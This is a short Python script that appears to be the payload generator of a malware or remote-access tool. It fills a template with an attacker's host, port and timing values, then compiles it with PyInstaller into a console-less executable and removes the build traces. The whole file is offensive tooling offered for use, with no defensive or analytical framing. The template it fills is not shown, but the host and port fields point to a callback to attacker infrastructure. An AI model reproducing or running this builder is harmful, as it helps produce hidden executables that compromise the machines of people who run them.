import os
import shutil
import platform
import subprocess

def Main(NAME, HOST, PORT, TIME):
    print(f"🔥 Generating Payload, Please Wait...")

    FILE = NAME + '.py'

    with open('engine/sc.txt', 'r') as source_file:
        source = source_file.read()

    with open('dist/' + FILE, 'w') as payload_file:
        payload_file.write(source)

    with open('dist/' + FILE, 'r') as file:
        code = file.read()
        code = code.replace('<TIME>', str(TIME))
        code = code.replace('<HOST>', str(HOST))
        code = code.replace('<PORT>', str(PORT))

    with open('dist/' + FILE, 'w') as file:
        file.write(code)

    command(FILE)
    cleanup(NAME)

    print(f"⭐ Payload saved as {NAME}.exe in '/dist' directory.")


# compile payload into exe
def command(name):
    command = f"pyinstaller --onefile --noconsole dist/{name}"
    if platform.system() == 'Windows':
        subprocess.run(command, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        subprocess.run(command, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, executable='/bin/bash')

# delete un-neccessary files 
def cleanup(name):
    os.remove(name + '.spec')
    shutil.rmtree("build")